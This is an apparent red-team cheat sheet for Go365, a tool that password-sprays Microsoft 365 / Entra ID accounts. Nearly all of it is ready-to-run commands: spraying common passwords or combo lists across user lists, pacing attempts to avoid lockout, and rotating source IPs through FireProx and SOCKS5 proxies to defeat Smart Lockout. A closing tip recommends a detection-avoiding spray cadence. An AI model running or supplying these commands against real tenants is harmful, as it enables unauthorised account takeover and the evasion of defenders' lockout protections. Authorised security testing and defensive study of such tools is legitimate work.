# Go365

**Tags:** `#go365` `#entraid` `#azuread` `#office365` `#passwordspray` `#cloud` `#golang`

Go-based password spraying tool (Optiv) for Microsoft 365 / Entra ID, sprayed via the Graph API token endpoint. Faster than PowerShell-based sprayers (compiled, concurrent) and detects account lockout so it can back off automatically.

**Source:** https://github.com/optiv/Go365
**Install:** download a prebuilt binary from releases, or `go build` from source.

```bash
# Binary is ./Go365 (capital G). -endpoint is REQUIRED: rst (login.microsoftonline.com/rst2.srf,
# SOAP) or graph (login.microsoft.com/common/oauth2/token, JSON).
./Go365 -endpoint rst -ul users.txt -p "Spring2024!" -d <domain.com> -o results.txt
./Go365 -endpoint graph -ul users.txt -p "Spring2024!" -d <domain.com>
```

## Inputs, Pacing & IP Rotation

```bash
# Password list (sprays each pw as its own cycle) or a user:pass combo file
./Go365 -endpoint graph -ul users.txt -pl passwords.txt -d <domain.com> -o out.txt
./Go365 -endpoint graph -up combo.txt -d <domain.com>            # combo = user:pass per line

# Built-in lockout-safe pacing: -w = seconds between each attempt (default 1),
# -delay = seconds between spray CYCLES (default 3600 = one round per hour)
./Go365 -endpoint graph -ul users.txt -pl passwords.txt -d <d> -w 2 -delay 3600

# Rotate source IP to beat IP-based Smart Lockout / blocking
./Go365 -endpoint graph -ul users.txt -p 'Spring2024!' -d <d> -url https://<id>.execute-api.us-east-1.amazonaws.com/fireprox
./Go365 -endpoint graph -ul users.txt -p 'Spring2024!' -d <d> -proxy 127.0.0.1:1080        # single SOCKS5
./Go365 -endpoint graph -ul users.txt -p 'Spring2024!' -d <d> -proxyfile socks.txt          # random SOCKS5 per attempt
```

> [!tip] Go365's `-delay 3600` default already implements "one password per account per
> hour" — the safe spray cadence — and it **detects lockout** (`[!] Account Locked Out`) so a
> triggered defence doesn't get mistaken for a bad password. Pair with `-url` (FireProx) to
> spread the source IP.
